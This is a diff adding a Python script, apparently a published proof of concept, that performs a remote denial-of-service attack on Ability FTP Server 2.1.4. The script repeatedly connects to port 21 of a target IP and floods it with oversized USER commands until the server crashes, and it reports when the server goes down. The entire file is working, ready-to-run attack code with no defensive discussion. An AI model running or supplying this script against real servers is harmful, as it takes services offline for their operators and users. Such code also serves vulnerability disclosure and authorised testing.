@@ -1,0 +1,61 @@
+#!/usr/bin/env python
+#
+# Exploit Title: Ability FTP Server afsmain.exe USER Command Remote Dos
+# Date: 2015-08-15
+# Exploit Author: St0rn <st0rn[at]anbu-pentest[dot]com>
+# Twitter: st0rnpentest
+#
+# Vendor Homepage: www.codecrafters.com
+# Software Link: http://www.codecrafters.com/AbilityFTPServer
+# Version: 2.1.4
+# Tested on: Windows 7
+#
+
+import socket
+import sys
+import os
+
+
+def clear():
+ os.system("cls")
+
+def banner():
+ print "############################################".center(80)
+ print "#        Ability FTP Server DoS PoC        #".center(80)
+ print "#             Author: St0rn                #".center(80)
+ print "#      <fabien[at]anbu-pentest[dot]com>    #".center(80)
+ print "############################################".center(80)
+   
+def createconn(ip):
+ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+ try:
+  s.connect((ip,21))
+ except:
+  print "\n"
+  print "[+] Server Down!".center(80)
+  sys.exit(0)
+ return s
+
+def crash(sock):
+ try:
+  while 1:
+   sock.send('USER '+'a'*99999)
+   sys.stdout.write('.')
+ except:
+  sock.close()
+
+############### Main ###############
+clear()
+banner()
+
+if len(sys.argv)==2:
+ print "\n"
+ print "Waiting 2 or 3 minutes before crash".center(80)
+ print "(The server can be run without afsloader.exe)".center(80)
+ while 1:
+  s=createconn(sys.argv[1])
+  crash(s)
+else:
+ print "\n"
+ print "Usage: AftpDos.py [Server IP]".center(80)
+ sys.exit(0)
